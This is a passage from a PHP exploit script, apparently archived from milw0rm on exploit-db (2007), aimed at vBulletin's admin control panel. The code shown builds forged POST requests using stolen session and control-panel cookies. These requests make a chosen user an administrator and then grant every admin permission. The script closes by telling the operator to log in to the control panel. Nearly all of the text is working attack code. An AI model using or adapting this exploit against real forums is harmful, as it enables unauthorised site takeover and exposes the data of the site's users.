Moderators\r\n$data.=\"&options%5Bshowreputation%5D=1\";\r\n$data.=\"&user%5Breputation%5D=10\";\r\n$data.=\"&user%5Bwarnings%5D=0\";\r\n$data.=\"&user%5Binfractions%5D=0\";\r\n$data.=\"&user%5Bipoints%5D=0\";\r\n$data.=\"&options%5Badminemail%5D=1\";\r\n$data.=\"&options%5Bshowemail%5D=0\";\r\n$data.=\"&options%5Binvisible%5D=0\";\r\n$data.=\"&options%5Bshowvcard%5D=0\";\r\n$data.=\"&options%5Breceivepm%5D=1\";\r\n$data.=\"&options%5Breceivepmbuddies%5D=0\";\r\n$data.=\"&options%5Bemailonpm%5D=0\";\r\n$data.=\"&user%5Bpmpopup%5D=0\";\r\n$data.=\"&options%5Bshowsignatures%5D=1\";\r\n$data.=\"&options%5Bshowavatars%5D=1\";\r\n$data.=\"&options%5Bshowimages%5D=1\";\r\n$data.=\"&user%5Bautosubscribe%5D=-1\";\r\n$data.=\"&user%5Bthreadedmode%5D=0\";\r\n$data.=\"&user%5Bshowvbcode%5D=1\";\r\n$data.=\"&user%5Bstyleid%5D=0\";\r\n$data.=\"&adminoptions%5Badminavatar%5D=0\";\r\n$data.=\"&adminoptions%5Badminprofilepic%5D=0\";\r\n$data.=\"&user%5Btimezoneoffset%5D=0\";\r\n$data.=\"&options%5Bdstauto%5D=1\";\r\n$data.=\"&options%5Bdstonoff%5D=0\";\r\n$data.=\"&user%5Bdaysprune%5D=-1\";\r\n$data.=\"&user%5Bjoindate%5D%5Bmonth%5D=2\";\r\n$data.=\"&user%5Bjoindate%5D%5Bday%5D=26\";\r\n$data.=\"&user%5Bjoindate%5D%5Byear%5D=2007\";\r\n$data.=\"&user%5Bjoindate%5D%5Bhour%5D=14\";\r\n$data.=\"&user%5Bjoindate%5D%5Bminute%5D=39\";\r\n$data.=\"&user%5Blastactivity%5D%5Bmonth%5D=2\";\r\n$data.=\"&user%5Blastactivity%5D%5Bday%5D=26\";\r\n$data.=\"&user%5Blastactivity%5D%5Byear%5D=2007\";\r\n$data.=\"&user%5Blastactivity%5D%5Bhour%5D=14\";\r\n$data.=\"&user%5Blastactivity%5D%5Bminute%5D=58\";\r\n$data.=\"&user%5Blastpost%5D%5Bmonth%5D=0\";\r\n$data.=\"&user%5Blastpost%5D%5Bday%5D=\";\r\n$data.=\"&user%5Blastpost%5D%5Byear%5D=\";\r\n$data.=\"&user%5Blastpost%5D%5Bhour%5D=\";\r\n$data.=\"&user%5Blastpost%5D%5Bminute%5D=\";\r\n$data.=\"&userid=\".$mu_uid;\r\n$data.=\"&ousergroupid=\";\r\n$data.=\"&odisplaygroupid=0\";\r\n$data.=\"&userfield%5Bfield1_set%5D=1\";\r\n$data.=\"&userfield%5Bfield2_set%5D=1\";\r\n$data.=\"&userfield%5Bfield3_set%5D=1\";\r\n$data.=\"&userfield%5Bfield4_set%5D=1\";\r\n$packet =\"POST \".$p.\"admincp/user.php?do=edit&u=$my_uid HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Pragma: no-cache\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie_prefix.\"lastactivity=0; \".$cookie_prefix.\"password=\".md5(trim($my_hash)).\"; \".$cookie_prefix.\"userid=\".$uid.\"; \".$cookie_prefix.\"sessionhash=\".trim($sess_hash).\"; \".$cookie_prefix.\"cpsession=\".trim($cpsess_hash).\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nsleep(1);\r\n\r\n//now give full rights to the new Administrator\r\n$data =\"do=update\";\r\n$data.=\"&adminhash=\".$adminhash;\r\n$data.=\"&adminpermissions%5Bcanadminsettings%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminstyles%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminlanguages%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminforums%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminthreads%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadmincalendars%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminusers%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminpermissions%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminfaq%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminimages%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminbbcodes%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadmincron%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminmaintain%5D=1\";\r\n$data.=\"&adminpermissions%5Bcanadminplugins%5D=1\";\r\n$data.=\"&cssprefs=\";\r\n$data.=\"&dismissednews=\";\r\n$data.=\"&userid=\".$my_uid;\r\n$data.=\"&oldpermissions=98300\";\r\n$data.=\"&adminpermissions%5Bcanadminupgrade%5D=0\";\r\n$packet =\"POST \".$p.\"admincp/adminpermissions.php?do=update HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Pragma: no-cache\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie_prefix.\"lastactivity=0; \".$cookie_prefix.\"password=\".md5(trim($my_hash)).\"; \".$cookie_prefix.\"userid=\".$uid.\"; \".$cookie_prefix.\"sessionhash=\".trim($sess_hash).\"; \".$cookie_prefix.\"cpsession=\".trim($cpsess_hash).\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho \"\\nnow go to http://\".$host.$path.\"admincp/index.php and login to the control panel...\";\r\n?>\r\n\r\n# milw0rm.com [2007-02-28]",
  "url": "https://www.exploit-db.com/exploits/3387"
}